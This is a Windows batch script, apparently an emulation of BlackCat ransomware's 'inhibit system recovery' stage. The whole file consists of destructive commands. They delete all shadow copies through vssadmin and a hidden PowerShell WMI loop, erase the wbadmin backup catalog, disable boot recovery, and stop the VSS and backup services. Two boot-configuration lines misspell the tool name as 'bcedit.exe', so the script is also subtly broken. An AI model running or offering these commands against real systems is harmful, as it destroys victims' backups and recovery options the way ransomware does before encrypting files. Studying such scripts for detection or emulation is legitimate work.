@echo off
REM BlackCat Inhibit System Recovery Staging Script
vssadmin.exe delete shadows /all /quiet
wbadmin.exe delete catalog -quiet
bcedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcedit.exe /set {default} recoveryenabled no
powershell -WindowStyle Hidden -Command "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"
net.exe stop "VSS"
net.exe stop "SDRSVC"
